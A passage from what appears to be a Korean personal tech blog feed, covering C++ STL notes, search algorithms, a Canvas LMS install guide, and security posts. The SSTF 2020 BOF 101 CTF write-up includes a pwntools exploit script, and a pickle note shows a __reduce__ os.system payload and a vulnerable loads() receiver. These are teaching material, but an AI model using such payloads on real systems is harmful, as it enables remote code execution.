“&gt;” “&lt;=” “&gt;=”) vector 선언#include &lt;cstdio&gt; #include &lt;vector&gt; using namespace std; vector &lt;int&gt; v1; vector &lt;int&gt; v2; vector 멤버 함수|Name|Context|v1.assign(a,b)| v1에 b의 값으로 a개의 원소를 할당한다.|v1.at(idx)| idx번째 원소를 참조한다. (범위 점검)|v1[idx]| idx번째 원소를 참조한다. (범위 점검 X)|v1.front()| 첫번째 원소를 참조한다.|v1.back()| 마지막 원소를 참조한다.|v1.clear()| 모든 원소를 제거한다(size만 제거하고, 메모리(capacity)는 남아있다.)|v1.push_back()| 마지막에 원소를 삽입한다.|v1.pop_back()| 마지막 원소를 삭제한다.|v1.begin()| 첫번째 원소를 가리킨다(iterator)|v1.end()| 마지막 원소를 가리킨다(iterator)|v1.rbegin()| 역순의 첫번째 원소를 가리킨다(reverse 개념)|v1.rend()| 역순의 마지막 원소를 가리킨다(reverse 개념)|v1.reserve(n)| n개의 원소를 저장할 위치를 예약한다. (동적할당)|v1.resize(n)| 크기를 n으로 변경한다.|v1.size()| 원소의 개수를 반환한다.|v1.capacity()| 할당된 공간의 크기를 반환한다.|v1.insert(a,b,c)| a의 위치에 b개의 c값을 삽입한다.|v1.insert(a,b)| a의 위치에 b값을 삽입하고 iterator를 반환한다.|v1.empty()| vector가 비어있는지 체크(true/false 반환)|v2.swap(v1)| v1와 v2의 원소, capacity를 바꾼다(swap 개념) 여기서 size() 와 capacity()는 다르다. size는 할당된 메모리안에 들어있는 요소의 개수를 반환하고, capacity는 할당된 메모리의 크기를 반환해주는 것이다. vector 사용 예제#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;vector&gt; using namespace std; int main(void) &#123; vector&lt;int&gt; v1; vector&lt;int&gt; v2; vector &lt;int&gt;::iterator iter; v1.push_back(10); // 맨 뒤에 원소 삽입 아래도 동일 v1.push_back(9); v1.push_back(8); for(iter = v1.begin(); iter != v1.end(); iter++)&#123; // iterator 반복문 선언 cout &lt;&lt; *iter &lt;&lt; endl; &#125; cout &lt;&lt; v1.size() &lt;&lt; &quot;\\n&quot;; // vector v1 사이즈 반환 (10,9,8 이니 총 3개 반환) cout &lt;&lt; v1.capacity() &lt;&lt; &quot;\\n&quot;; // vector v1 할당 메모리 반환 v1.pop_back(); // 맨 끝에 있는 원소를 삭제, 8이 삭제되겠지~ //v1.clear(); // 모든 원소 삭제 cout &lt;&lt; v1.size() &lt;&lt; &quot;\\n&quot;; // vector v1 사이즈 반환 (clear해서 0 반환) cout &lt;&lt; (v1.empty() ? &quot;true&quot;:&quot;false&quot;) &lt;&lt; &quot;\\n&quot;; // vector가 비어있는지 체크(삼항 연산자 사용) cout &lt;&lt; v1.front() &lt;&lt; &quot;\\n&quot;; // 맨 앞의 원소 반환 및 참조 cout &lt;&lt; v1.back() &lt;&lt; &quot;\\n&quot;; // 맨 뒤의 원소 반환 및 참조 &#125; setset은 associative container로 노드 기반 컨테이너로 구성되어 있고 균형 이진트리이다. key로 불리는 원소의 집합으로 이루어진 컨테이너이다. (중복 허용 X) insert 함수에 의해서 원소가 삽입되는데 이 떄의 원소는 자동으로 정렬(오름차순)된다. 허용 연산자(“==”, “!=”, “&lt;” “&gt;” “&lt;=” “&gt;=”) set 선언#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;set&gt; using namespace std; int main(void)&#123; set&lt;int&gt; s1; // 기본 생성자 선언 &#125; set 초기화|Name|Context|set&lt;자료형&gt; 변수이름| 기본 생성자 선언|set&lt;자료형&gt; 변수이름(복사할 변수이름)| 생성자 선언 후 복사한 값으로 초기화 set 반복자(iterator)|Name|Context|s1.begin()| 첫번째 원소를 가리킨다.|s1.end()| 마지막 원소를 가리킨다.|s1.rbegin()| 거꾸로해서 첫번째 원소를 가리킨다. (즉, 마지막 원소 = 첫번째)|s1.rend()| 거꾸로해서 마지막 원소를 가리킨다. (즉, 첫번째 원소 = 마지막)|s1.cbegin()| begin과 동일하나 const로 선언|s1.cend()| end과 동일하나 const로 선언|s1.crbegin()| rbegin과 동일하나 const로 선언|s1.crend()| rend와 동일하나 const로 선언 set 용량, 크기(size, capacity)|Name|Context|s1.empty()| set(s1)이 비어있는지 체크(true/false) 반환|s1.size()| s1의 size(원소 갯수) 반환|s1.max_size()| s1이 가질 수 있는 최대 사이즈(크기) 반환 set 삽입, 삭제|Name|Context|s1.insert()| s1에 원소 삽입|s1.erase()| s1에 저장된 원소 삭제(지우기)|s1.swap(s2)| s1에 저장된 원소와 s2를 변경(swap)|s1.clear()| s1에 저장된 원소 모두 삭제|s.emplace()| move()를 사용해서 객체 저장|s.emplace_hint()| 삽입될 위치에 대한 힌트를 삽입 set의 기능|Name|Context|s1.find()| s1에서 값을 검색(값이 있다면 iterator 반환, 아니면 end 반환)|s1.count()| s1에 저장된 요소 개수 반환|s1.lower_bound()| s1의 요소의 위치에 대한 iterator 반환|s1.upper_bound()| s1의 요소의 위치에 대한 iterator 반환|s1.equal_range()| 지정 요소에 대한 iterator 반환 set 사용 예제#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;set&gt; using namespace std; int main(void)&#123; set&lt;int&gt; s1; set&lt;int&gt;::iterator iter; s1.insert(1); s1.insert(2); s1.insert(3); for(iter = s1.begin(); iter != s1.end(); iter++)&#123; // iterator cout &lt;&lt; *iter &lt;&lt; endl; &#125; cout &lt;&lt; (s1.empty() ? &quot;true&quot;:&quot;false&quot;) &lt;&lt; &quot;\\n&quot;; // s1 empty check(true/false) cout &lt;&lt; s1.size() &lt;&lt; &quot;\\n&quot;; // size 반환(result : 3) cout &lt;&lt; s1.max_size() &lt;&lt; &quot;\\n&quot;; // 최대 size 반환 s1.erase(3); // s1의 원소 3 지우기 set&lt;int&gt;::iterator iter2 = s1.find(2); // s1에서 2의 값을 검색 if(iter2 == s1.end())&#123; // 조건문 시작 만약 find해서 결과를 못찾았다면? cout &lt;&lt; &quot;not found..&quot; &lt;&lt; endl; // not found &#125;else&#123; // 결과가 있다면? cout &lt;&lt; &quot;found!!&quot; &lt;&lt; endl; // found &#125; s1.clear(); // s1의 모든 원소 지우기 &#125; mapmap은 set과 같이 associative container의 종류로 노드 기반으로 이루어진 균형 이진 트리 구조이다. map은 key, value로 이루어져 있고 pair 객체 형태로 저장된다. key는 중복이 불가능(multimap에서는 사용이 가능하다)하며, set과 동일하게 원소가 삽입되면서 자동으로 오름차순 정렬이 된다. map은 저장 공간의 필요에 따라서 allocator(동적 할당) 객체를 사용한다. map 선언#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;map&gt; using namespace std; map&lt;string, int&gt; m1; map 반복자(iterator)|Name|Context|s1.begin()| 첫번째 원소를 가리킨다.|s1.end()| 마지막 원소를 가리킨다.|s1.rbegin()| 거꾸로해서 첫번째 원소를 가리킨다. (즉, 마지막 원소 = 첫번째)|s1.rend()| 거꾸로해서 마지막 원소를 가리킨다. (즉, 첫번째 원소 = 마지막)|s1.cbegin()| begin과 동일하나 const로 선언|s1.cend()| end과 동일하나 const로 선언|s1.crbegin()| rbegin과 동일하나 const로 선언|s1.crend()| rend와 동일하나 const로 선언 map 용량, 크기(size, capacity)|Name|Context|s1.empty()| set(s1)이 비어있는지 체크(true/false) 반환|s1.size()| s1의 size(원소 갯수) 반환|s1.max_size()| s1이 가질 수 있는 최대 사이즈(크기) 반환 map 삽입, 삭제|Name|Context|s1.insert()| s1에 원소 삽입|s1.erase()| s1에 저장된 원소 삭제(지우기)|s1.swap(s2)| s1에 저장된 원소와 s2를 변경(swap)|s1.clear()| s1에 저장된 원소 모두 삭제|s.emplace()| move()를 사용해서 객체 저장|s.emplace_hint()| 삽입될 위치에 대한 힌트를 삽입 map의 기능|Name|Context|s1.find()| s1에서 값을 검색(값이 있다면 iterator 반환, 아니면 end 반환)|s1.count()| s1에 저장된 요소 개수 반환|s1.lower_bound()| s1의 요소의 위치에 대한 iterator 반환|s1.upper_bound()| s1의 요소의 위치에 대한 iterator 반환|s1.equal_range()| 지정 요소에 대한 iterator 반환 map 사용 예제#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;map&gt; using namespace std; int main(void)&#123; map&lt;string, int&gt; m1; map&lt;string, int&gt;::iterator it; m1.insert(make_pair(&quot;key&quot;, 1)); // map에 key,value 삽입(make_pair 사용) m1.insert(make_pair(&quot;key2&quot;, 2)); m1.insert(make_pair(&quot;key3&quot;, 3)); cout &lt;&lt; (m1.empty() ? &quot;true&quot;:&quot;false&quot;) &lt;&lt; &quot;\\n&quot;; // map이 비어있는지 검사 cout &lt;&lt; m1.count(&quot;key1&quot;) &lt;&lt; &quot;\\n&quot;; // 카운트 반환 1 or 0 cout &lt;&lt; m1.count(&quot;key2&quot;) &lt;&lt; &quot;\\n&quot;; // 카운트 반환 1 or 0 cout &lt;&lt; m1.find(&quot;key1&quot;)-&gt;second &lt;&lt; &quot;\\n&quot;; // key1 검색 map&lt;string, int&gt;::iterator iter = m1.find(&quot;key4&quot;); // iterator key search if(iter == m1.end())&#123; // key를 못찾아서 end 반환했을 때 cout &lt;&lt; &quot;key not found&quot; &lt;&lt; &quot;\\n&quot;; &#125; for(it = m1.begin(); it != m1.end(); it++)&#123; // iterator 접근 cout &lt;&lt; it-&gt;first &lt;&lt; it-&gt;second &lt;&lt; endl; &#125; &#125; map은 set과 사용하는 멤버 함수가 동일하다. unordered_setset과 거의 동일하지만 unordered_set은 원소를 삽입할 때 정렬하지 않는 컨테이너이고, set은 이진 탐색 트리의 구조지만 unordered_set은 해쉬 테이블의 구조를 가지고 있다. unordered_set 사용 예제#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;unordered_set&gt; using namespace std; int main(void)&#123; unordered_set&lt;int&gt; us1; // 생성자 선언 unordered_set&lt;int&gt;::iterator it; // iterator 선언 us1.insert(1); // us1(set)에 원소 삽입 us1.insert(2); us1.insert(3); us1.insert(4); for(it = us1.begin(); it != us1.end(); it++)&#123; //iterator 반복자 cout &lt;&lt; *it &lt;&lt; endl; // 출력 &#125; &#125; unordered_mapunordered_map 역시 map과 사용하는 방법은 동일하기 때문에 둘 중 어느것을 쓰던 문제가 없다. 다만 차이점이라면 set, unordered_set과 같이 이진 탐색 트리와 해쉬 테이블의 차이점을 가지고 있다. 속도가 빨라야 한다면 unordered_map를 사용하는 것도 권장할 수 있다. 하지만 데이터가 많아진다면 unordered_map 역시 속도가 느리다고 할 수 있는데, 결국 데이터가 적다면 unordered_map이 속도면에서는 유리하고 데이터가 많다면 map이 좋다. unordered_map 사용 예제#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;unordered_map&gt; using namespace std; int main(void)&#123; unordered_map&lt;string, int&gt; um1; // 생성자 unordered_map&lt;string, int&gt;::iterator it; um1.insert(make_pair(&quot;key1&quot;, 1)); // map에 원소 삽입(make_pair(key, value)) um1.insert(make_pair(&quot;key2&quot;, 2)); for(it = um1.begin(); it != um1.end(); it++)&#123; // iterator 반복문 cout &lt;&lt; it-&gt;first &lt;&lt; it-&gt;second &lt;&lt; endl; &#125; cout &lt;&lt; um1.find(&quot;key1&quot;)-&gt;second &lt;&lt; &quot;\\n&quot;; // key find cout &lt;&lt; (um1.empty() ? &quot;true&quot;:&quot;false&quot;) &lt;&lt; &quot;\\n&quot;; // map(um1)이 비어있는지 체크하고 true/false 반환 &#125; References https://modoocode.com/ https://blockdmask.tistory.com/76 https://blockdmask.tistory.com/70 https://hwan-shell.tistory.com/130 https://blankspace-dev.tistory.com/347 https://twpower.github.io/91-how-to-use-map-in-cpp","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://blog.jhyeon.dev/tags/C/"},{"name":"STL","slug":"STL","permalink":"https://blog.jhyeon.dev/tags/STL/"}]},{"title":"탐색 알고리즘(선형, 이진) 정리","slug":"search-algorithm-200910","date":"2020-09-09T15:00:00.000Z","updated":"2020-09-09T15:00:00.000Z","comments":true,"path":"2020/09/10/search-algorithm-200910/","link":"","permalink":"https://blog.jhyeon.dev/2020/09/10/search-algorithm-200910/","excerpt":"","text":"탐색 알고리즘 종류1. 선형 탐색법 (리니어 서치) 왼쪽부터 순서대로 하나씩 확인해 나가는 방법 (한쪽 끝에서 다른 한쪽 끝으로 나아가는 방법) 탐색 시작 → 결과를 탐색할 때까지 반복문 실행 → 결과값 반환 후 종료 #!/usr/bin/python3 def search(array, target): i = 0 while i &lt; len(array): if arr[i] == target: return i i += 1 return &quot;error&quot; array = [1,2,3,5,7,8,9] # index 0~6 target = 9 print(search(array,target)) #result 6 2. 이진 알고리즘 탐색(binary) 정렬된 리스트(배열) 에서 원하는 수(target) 값을 찾는 알고리즘 입니다. 선형 알고리즘 탐색 방법과 다르게 “이진 알고리즘” 탐색은 리스트가 정렬되어 있어야 한다는 점입니다. 배열의 전체의 중간 값(middle) 을 비교 합니다. 중간 값(middle) 이 원하는 수(target) 값보다 작다면 왼쪽, 크다면 오른쪽을 선택하여 탐색을 시작합니다. 선택된 방향에서 중간 값(middle) 과 원하는 수(target) 을 비교해서 같다면 탐색을 종료합니다. #coding=UTF-8 def binarysearch(array, target, left, right): middle_idx = (left+right)//2 # 중간 지점 탐색 print(middle_idx) middle = array[middle_idx] # Array 배열 적용 if target == middle: # 탐색 값과 중간 값이 같다면 print(&#39;result : &#123;&#125;&#39;.format(middle)) # 결과 리턴 elif middle &gt; target: # 탐색 값이 중간 값 보다 크다면 binarysearch(array, target, left, middle_idx-1) # 함수실행 elif middle &lt; target: # 탐색 값이 중간 값 보다 작다면 binarysearch(array, target, middle_idx+1, right) # 함수실행 else: return False # 위 경우 모두 만족하지 않을 때 false 반환 array = [1,2,3,5,7,11,13,9,17,15,19,21] length = len(array) print(&quot;length : &#123;&#125;&quot;.format(length)) array.sort() print(&quot;sort : &#123;&#125;&quot;.format(array)) target = 15 left = 0 right = length-1 binarysearch(array, target, 0, right) References https://velog.io/@keemun/1 https://velog.io/@madfinger/Binary-Search이진-탐색-파이썬","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"https://blog.jhyeon.dev/tags/Algorithm/"},{"name":"선형 탐색","slug":"선형-탐색","permalink":"https://blog.jhyeon.dev/tags/%EC%84%A0%ED%98%95-%ED%83%90%EC%83%89/"},{"name":"이진 탐색","slug":"이진-탐색","permalink":"https://blog.jhyeon.dev/tags/%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89/"}]},{"title":"SSTF 2020 BOF 101 Write up","slug":"sstf-200818","date":"2020-08-17T15:00:00.000Z","updated":"2020-08-17T15:00:00.000Z","comments":true,"path":"2020/08/18/sstf-200818/","link":"","permalink":"https://blog.jhyeon.dev/2020/08/18/sstf-200818/","excerpt":"","text":"우선 file 명령어와 checksec을 사용해서 바이너리 컴파일 정보와, Memory Mitigation을 확인 해보자. 사진과 같이 x64 dynamic linked binary임을 알 수 있고, FULL RELRO, NX, PIE가 활성화 되어 있는 것을 알 수 있다. IDA로 바이너리 분석을 해보면 main() 함수의 동작 로직은 다음과 같다. 바이너리가 실행되면 scanf 함수를 통해 사용자에게 입력받는 로직이고, 0xdeadbeef 값을 세팅하고 있어 BOF를 통해 해당 메모리 영역을 덮어버리면 BOF Detected!! 가 발생한다. 그럼 시나리오는 다음과 같이 생각해볼 수 있다. 입력 받는 메모리 공간은 rbp-0x90(144) 만큼을 받고 있으니, 140만큼 써주고 체크 로직을 통과하기 위해 나머지 4byte 값을 0xdeadbeef 로 만들어 준다음, RSP를 8byte dummy로 채우고 RET 에서 printflag() 함수로 리턴 시켜준다면 플래그를 획득할 수 있는 구조가 된다. 32비트 환경에서 컴파일 된 바이너리는 SFP(4byte) + RET(4byte)를 가지지만, 64비트 환경에서 컴파일 된 바이너리는 RSP(8byte) + RET(6byte)의 값을 가지는 것을 고려해주면 된다. 1 #!/usr/bin/python3 2 3 from pwn import * 4 5 #p = process(&#39;./bof101&#39;) 6 7 p = remote(&#39;bof101.sstf.site&#39;,1337) 8 9 e = ELF(&#39;./bof101&#39;) 10 11 p.recvuntil(&#39;addr:&#39;) 12 13 flag_addr = int(p.recv(15),16) 14 15 p.recvline() 16 17 print(hex(flag_addr)) 18 19 payload = &quot;A&quot;*140 20 payload += p32(0xdeadbeef) 21 payload += &quot;A&quot;*8 22 payload += p64(flag_addr) 23 24 p.sendlineafter(&#39;: &#39;,payload) 25 26 p.interactive() SCTF&#123;n0w_U_R_B0F_3xpEr7&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/tags/Pwnable/"},{"name":"BOF","slug":"BOF","permalink":"https://blog.jhyeon.dev/tags/BOF/"}]},{"title":"canvas lms installation","slug":"canvas-install-200627","date":"2020-06-26T15:00:00.000Z","updated":"2020-06-26T15:00:00.000Z","comments":true,"path":"2020/06/27/canvas-install-200627/","link":"","permalink":"https://blog.jhyeon.dev/2020/06/27/canvas-install-200627/","excerpt":"","text":"OSOS : Ubuntu 16.04 Desktop(http://old-releases.ubuntu.com/releases/16.04.4/) Canvas LMS - Open Source : https://github.com/instructure/canvas-lms 설치postgresql 설치$ sudo apt-get install postgresql-9.5 관리자 계정 생성adduser sysadmin sysadmin 계정에 대한 Root 권한 부여visudo → User Privileges → sysadmin ALL=(ALL:ALL) ALL sysadmin 계정으로 사용자 변경su sysadmin postgres 설정sudo -u postgres createuser canvas --no-createdb \\ --no-superuser --no-createrole --pwprompt sudo -u postgres createdb canvas_production --owner=canvas git 설정sudo apt-get install git-core git clone https://github.com/instructure/canvas-lms.git canvas cd canvas git checkout stable installation(1)sudo mkdir -p /var/canvas sudo chown -R sysadmin /var/canvas $(canvas) cp -av . /var/canvas Dependencysudo apt-get install software-properties-common sudo add-apt-repository ppa:brightbox/ruby-ng sudo apt-get update ruby2.4 installsudo apt-get install ruby2.4 ruby2.4-dev zlib1g-dev libxml2-dev \\ libsqlite3-dev postgresql libpq-dev \\ libxmlsec1-dev curl make g++ node.js installcurl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash - sudo apt-get install nodejs set sysadmin postgres superuser$ sudo -u postgres createuser $USER $ sudo -u postgres psql -c &quot;alter user $USER with superuser&quot; postgres bundler and canvas dependencies$ sudo gem install bundler --version 1.13.7 $ bundle _1.13.7_ install --path vendor/bundle yarn installation$ curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add - $ echo &quot;deb https://dl.yarnpkg.com/debian/ stable main&quot; | sudo tee /etc/apt/sources.list.d/yarn.list $ sudo apt-get update &amp;&amp; sudo apt-get install yarn=1.10.1-1 $ sudo apt-get install python $ yarn install canvas default config$ for config in amazon_s3 database \\ delayed_jobs domain file_store outgoing_mail security external_migration; \\ do cp config/$config.yml.example config/$config.yml; done dynamic setting$ cp config/dynamic_settings.yml.example config/dynamic_settings.yml $ (check) nano config/dynamic_settings.yml (vi로 진행해도 상관 없음) database setting$ cp config/database.yml.example config/database.yml $ (check) nano config/database.yml (vi로 진행해도 상관 없음) # do not create a queue: section for your test environment test: adapter: postgresql encoding: utf8 database: canvas_test host: localhost username: canvas timeout: 5000 development: adapter: postgresql encoding: utf8 database: canvas_development timeout: 5000 production: adapter: postgresql encoding: utf8 database: canvas_production host: localhost username: canvas password: your_password timeout: 5000 outgoing mail config$ cp config/outgoing_mail.yml.example config/outgoing_mail.yml $ (check) nano config/outgoing_mail.yml (vi로 진행해도 상관 없음) url config$ cp config/domain.yml.example config/domain.yml $ (check) nano config/domain.yml (vi로 진행해도 상관 없음) production: domain: &quot;canvas.jhyeon.xyz&quot; # whether this instance of canvas is served over ssl (https) or not # defaults to true for production, false for test/development ssl: false # files_domain: &quot;canvasfiles.example.com&quot; security config$ cp config/security.yml.example config/security.yml $ nano config/security.yml (vi로 진행해도 상관 없음) production: &amp;default # replace this with a random string of at least 20 characters encryption_key: 12345123451234512345 lti_iss: &#39;https://canvas.instructure.com&#39; generate assets$ (/var/canvas) mkdir -p log tmp/pids public/assets app/stylesheets/brandable_css_brands $ (/var/canvas) touch app/stylesheets/_brandable_variables_defaults_autogenerated.scss $ (/var/canvas) touch Gemfile.lock $ (/var/canvas) touch log/production.log $ (/var/canvas) sudo adduser --disabled-password --gecos canvas canvasuser $ (/var/canvas) sudo chown -R canvasuser config/environment.rb log tmp public/assets \\ app/stylesheets/_brandable_variables_defaults_autogenerated.scss \\ app/stylesheets/brandable_css_brands Gemfile.lock config.ru $ (/var/canvas) yarn install $ (/var/canvas) RAILS_ENV=production bundle exec rake canvas:compile_assets $ (/var/canvas) sudo chown -R canvasuser public/dist/brandable_css $ (/var/canvas) RAILS_ENV=production bundle exec rake brand_configs:generate_and_upload_all * VM 메모리 최소 8GB 메모리 구성 필요합니다. database populationRAILS_ENV=production bundle exec rake db:initial_setup apache2 installation$ sudo apt-get install passenger libapache2-mod-passenger apache2 $ sudo a2enmod rewrite $ sudo a2enmod passenger $ sudo a2enmod ssl $ sudo unlink /etc/apache2/sites-enabled/000-default.conf 아래 단계 완료 후 수행 $ sudo a2ensite canvas &lt;VirtualHost *:80&gt; ServerName canvas.jhyeon.xyz ServerAlias canvasfiles.canvas.jhyeon.xyz ServerAdmin admin@canvas.jhyeon.xyz DocumentRoot /var/canvas/public ErrorLog /var/log/apache2/canvas_errors.log LogLevel warn CustomLog /var/log/apache2/canvas_access.log combined SetEnv RAILS_ENV production &lt;Directory /var/canvas/public&gt; Options All AllowOverride All Require all granted Options -MultiViews &lt;/Directory&gt; &lt;/VirtualHost&gt; cache config$ sudo add-apt-repository ppa:chris-lea/redis-server $ sudo apt-get update $ sudo apt-get install redis-server $ sudo cp config/cache_store.yml.example config/cache_store.yml $ sudo vi config/cache_store.yml test: cache_store: redis_store development: cache_store: redis_store production: cache_store: redis_store $ sudo chown canvasuser config/cache_store.yml $ sudo cp config/redis.yml.example config/redis.yml $ sudo vi config/redis.yml production: servers: - redis://localhost $ sudo chown canvasuser config/redis.yml start server$ sudo ln -s /var/canvas/script/canvas_init /etc/init.d/canvas_init $ sudo update-rc.d canvas_init defaults $ sudo /etc/init.d/canvas_init start $ sudo /etc/init.d/apache2 restart 참고 https://github.com/instructure/canvas-lms/wiki/Production-Start https://www.notion.so/jhyeon/Canvas-LMS-Install-bdbe60b1a7bd40029a5f241ed77a9d49","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"CANVAS","slug":"CANVAS","permalink":"https://blog.jhyeon.dev/tags/CANVAS/"},{"name":"LMS","slug":"LMS","permalink":"https://blog.jhyeon.dev/tags/LMS/"}]},{"title":"동아리 워게임 홍보(?)","slug":"bangsiri-wargame-200619","date":"2020-06-18T15:00:00.000Z","updated":"2020-06-18T15:00:00.000Z","comments":true,"path":"2020/06/19/bangsiri-wargame-200619/","link":"","permalink":"https://blog.jhyeon.dev/2020/06/19/bangsiri-wargame-200619/","excerpt":"","text":"올해 3월을 끝으로 기존 CTFd 에서 운영하던 동아리 학습용 CTF 서버를 자체 플랫폼으로 이전 하였습니당, 문제도 기존과 다르게 모의 해킹 분야별로 많이 업데이트 할 예정이고, 동아리 원이 아니더라도 문제 풀어보실 수 있으니 많이 이용 해주세요! https://wargame.hacking.one/","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"B@ngsiri","slug":"B-ngsiri","permalink":"https://blog.jhyeon.dev/tags/B-ngsiri/"}]},{"title":"Python Pickle Library Vulnability","slug":"python-pickle-200616","date":"2020-06-15T15:00:00.000Z","updated":"2020-06-15T15:00:00.000Z","comments":true,"path":"2020/06/16/python-pickle-200616/","link":"","permalink":"https://blog.jhyeon.dev/2020/06/16/python-pickle-200616/","excerpt":"","text":"Python PicklePython Pickle은 직렬화(Pickling) , 역직렬화(UnPickling) 을 지원하는 모듈 입니다. Vuln해당 모듈은 공식 문서에서도 사용을 권장하지 않습니다, 데이터를 역직렬화(UnPickling) 할 때, 임의의 코드를 실행하는 등의 악의적인 데이터로 구성하여 RCE(Remote Control Exexecution) 등의 공격이 가능하게 됩니다. object.__getnewargs_ex__() object.__getnewargs__() object.__getstate__() object.__setstate__(state) object.__reduce__() object.__reduce_ex__(protocol) reduce() 메서드는 아무런 인자도 받지 않지만, 튜플을 반환할 때 함수를 반환하는 것이 가능합니다. [pickling.py] import os import cPickle import sys import base64 cmd = &#39;id&#39; class Exploit(object): def __reduce__(self): return (os.system, (cmd,)) shellcode = cPickle.dumps(Exploit()) print base64.b64encode(shellcode) [ex.py] import os import cPickle import sys import base64 data = raw_input(&quot;&quot;) print cPickle.loads(base64.b64decode(data)) References https://docs.python.org/ko/3/library/pickle.html#data-stream-format https://github.com/JHye0n/Web-CTF-Cheatsheet","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.jhyeon.dev/tags/Python/"}]},{"title":"S/W 소프트웨어 개발 프로세스 모델","slug":"swmodel-200613","date":"2020-06-12T15:00:00.000Z","updated":"2020-06-12T15:00:00.000Z","comments":true,"path":"2020/06/13/swmodel-200613/","link":"","permalink":"https://blog.jhyeon.dev/2020/06/13/swmodel-200613/","excerpt":"","text":"개발 프로세스와 관련해서 여러 많은 자료를 찾아 보고 개인 공부 겸 정리 하였습니다. 이론 부분에 있어서도 한 두가지가 아니다보니 많이 헷갈리는데 앞으로 더 꾸준히 공부해야 겠네요.. 해당 내용은 아래 노션에 작성되어 있습니다. https://www.notion.so/jhyeon/S-W-ed3a6d56bb2f42c199e93a15ceb35342","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"https://blog.jhyeon.dev/tags/Algorithm/"}]},{"title":"동아리 온라인 시험 플랫폼 개발 후기","slug":"exam-platformdev-200612","date":"2020-06-11T15:00:00.000Z","updated":"2020-06-11T15:00:00.000Z","comments":true,"path":"2020/06/12/exam-platformdev-200612/","link":"","permalink":"https://blog.jhyeon.dev/2020/06/12/exam-platformdev-200612/","excerpt":"","text":"간단, 계기요즘 코로나19 영향 때문에 학교는 물론 동아리 운영도 쉽지 않다. 이번 동아리 신입생 선발 시험에 관련해서 임원진들과 몇가지 생각해본 것이 있는데 오프라인으로 진행하기에는 사실 장소 대여도 쉽지 않아서 여러 방안을 생각해보다가 온라인으로 시험을 진행하기로 했는데 이 방법 역시 쉬운 방법만은 아니였다. 이유는 시험에 대한 감독을 진행할 수 없다는 점(부정 행위)에 대한 문제점이 가장 크게 작용하였는데, 제출 확인을 할 때 출제자 들이 조금 더 엄격하게 체크해야 하는 쪽이 제일 최선의 방법인 것 같았다. 또한 C/Python 마다 속해있는 인원이 달라 문제 배포에 대해서도 문제점이 있었는데, 이 부분은 내가 웹 개발을 해주겠다고 해서 문제가 일단 해결되었다. 개발 과정시험은 오는 6월 18일에 진행을 예정하고 있다. 사실 BoB 준비도 그렇고 다른 일때문에 바쁘다 보니 5월 말이나 되서야 개발을 시작하게 되었는데 오늘 날짜로 한 2주 살짝 넘게 작업을 했었고, 교내 동아리 서버를 이용해서 도커로 웹 서버를 구축하고 기능을 하나씩 만들어 갔던 기억이 있다. 사실 단순하게 운영에 꼭 필요한 기능들만 생각하고 개발을 했는데 시큐어 코딩을 계속 적용해야 하다보니 생각해야할 부분이 많았다. 또한, 개발하면서 임원진들이 개선 요청이 자주 있었을뿐더러 테스트를 할 때 예상과 다르게 작동되는 기능이 몇가지 있어서 계속 수정 하면서 릴리즈 했던 기억이 있다.. 주요 기능 로그인 회원가입 코드 컴파일러 시험 문제 풀이 제출 [로그인] &amp; [회원가입] : 신입생(회원) 여부를 체크하기 위한 목적 [코드컴파일러] : 문제를 보고 자신이 작성한 코드가 정상적으로 작동되는지를 보기 위한 컴파일러이다. (Sphere Engine API) [시험문제] : 회원가입 때 본인이 응시하겠다고 하는 분야를 바탕으로 (공통 분야/선택한 분야) 를 포함하여 문제가 공개된다. [제출] : 제출할 때 편의성(?) 을 조금 더 높히고자 파일을 업로드 받아 메일 서버를 통해서 동아리 관리 계정으로 이메일이 발송되도록 구현 했다. 개인적인 생각혼자서 웹 하나를 구축해 나가면서 생각지도 못한 부분에서 취약점도 있었고, 로직 버그도 1~2개씩 있었던 것 같다. 그리고 대부분 DB 서버로 연동해서 자동화 처리를 수행했는데 시험 페이지쪽에 시간을 설정하는 쪽에는 아직 수동으로 구축되어 있다. 이 부분은 아마 이번 주말내에 관리 모듈에서 연동할 수 있도록 해서 추가할 예정중에 있다. 그리고 기능에 대해서도 자체적으로 구현하면 좋을 수 있는 것들이 많았지만 시간적인 문제도 있었기에 모든 부분을 다 구현하지는 못했다. 하나의 웹을 만들어 나가면서 부족한 점도 많이 느낄 수 있었던 부분인 것 같다. 오픈 소스https://github.com/JHye0n/bangsiri_online_exam","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"Development","slug":"Development","permalink":"https://blog.jhyeon.dev/tags/Development/"}]},{"title":"워게임 사이트 추천","slug":"wargame-list-200603","date":"2020-06-02T15:00:00.000Z","updated":"2020-06-02T15:00:00.000Z","comments":true,"path":"2020/06/03/wargame-list-200603/","link":"","permalink":"https://blog.jhyeon.dev/2020/06/03/wargame-list-200603/","excerpt":"","text":"해당 자료는 아래 노션에 작성되어 있습니다. 